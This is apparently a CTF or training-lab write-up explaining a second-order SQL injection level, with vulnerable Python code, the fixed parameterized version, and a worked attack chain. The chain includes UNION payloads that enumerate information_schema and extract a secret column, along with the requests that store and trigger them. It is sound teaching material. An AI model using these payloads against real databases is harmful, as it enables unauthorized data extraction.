# Level 2-3: Second-Order (Stored) SQLi

**URL:** `/reservas`

**Objective:** Extract the flag from `lista_vip` using second-order SQL injection. The injection payload is stored safely in the database via a parameterized INSERT, then triggered unsafely when the stored value is read back and interpolated into a subsequent query.

## Vulnerable Code

```python
# Step 1 — safe INSERT (parameterized)
cur.execute("INSERT INTO reservas (nome, codigo) VALUES (%s, %s)", (nome, codigo))

# Step 2 — safe SELECT of stored nome
cur.execute("SELECT nome FROM reservas WHERE codigo = %s LIMIT 1", (codigo,))
nome = row[0]

# Step 3 — unsafe use of stored nome in a second query
query = f"SELECT b.setor FROM bilhetes b JOIN reservas r ON b.codigo = r.codigo WHERE r.nome = '{nome}'"
cur.execute(query)
```

The INSERT is safe. The initial SELECT is safe. The vulnerability is in Step 3: the `nome` value, now trusted because it came from the database rather than direct user input, is interpolated into a raw query string. The developer implicitly trusted data from the database but that data was user-controlled when it was stored.

## Why This Is Different from First-Order SQLi

In first-order injection, the payload is injected and executed in the same request. Here:

- **Request 1** (`POST /api/reservar`): payload is stored, no injection occurs.
- **Request 2** (`GET /api/ver-reserva`): the stored payload is retrieved and injected into a new query.

Scanners that test each input in isolation will miss this. The attack surface is the stored state, not the current input.

## Attack Chain

### Step 1 — Register a reservation with a UNION payload as the name to get the tables and columns

```sql
aa' UNION SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' LIMIT 1 OFFSET 1 --
```

We increase the offset until we find the `lista_vip` table.

```sql
aa' UNION SELECT column_name FROM information_schema.columns WHERE table_name='lista_vip' LIMIT 1 OFFSET 0 --
```

We find the `segredo` column.

### Step 2 — Register a reservation with a UNION payload as that retrieves the `segredo` value from `lista_vip` when the reservation is viewed

```
POST /api/reservar
{"nome": "' UNION SELECT segredo FROM lista_vip--", "codigo": "X9"}
```

The server parameterizes the INSERT so the payload is stored literally as the `nome` value. No injection happens yet.

### Step 2 — Trigger the second query

```
GET /api/ver-reserva?codigo=X9
```

The server first runs the safe lookup:

```sql
SELECT nome FROM reservas WHERE codigo = 'X9' LIMIT 1
```

It retrieves `' UNION SELECT segredo FROM lista_vip--` and interpolates it into the next query:

```sql
SELECT b.setor FROM bilhetes b JOIN reservas r ON b.codigo = r.codigo WHERE r.nome = '' UNION SELECT segredo FROM lista_vip--'
```

The WHERE clause matches no rows (empty string), but the UNION appends all rows from `lista_vip.segredo`. The server returns:

```json
{"setor": "JUMENTOS{st0r3d_4nd_d4ng3r0us}"}
```

## Fixed Code

```python
query = "SELECT b.setor FROM bilhetes b JOIN reservas r ON b.codigo = r.codigo WHERE r.nome = %s"
cur.execute(query, (nome,))
```

Parameterized queries must be used at every point data touches SQL, including when that data originates from the database. The origin of a value does not make it safe, only the query interface does.
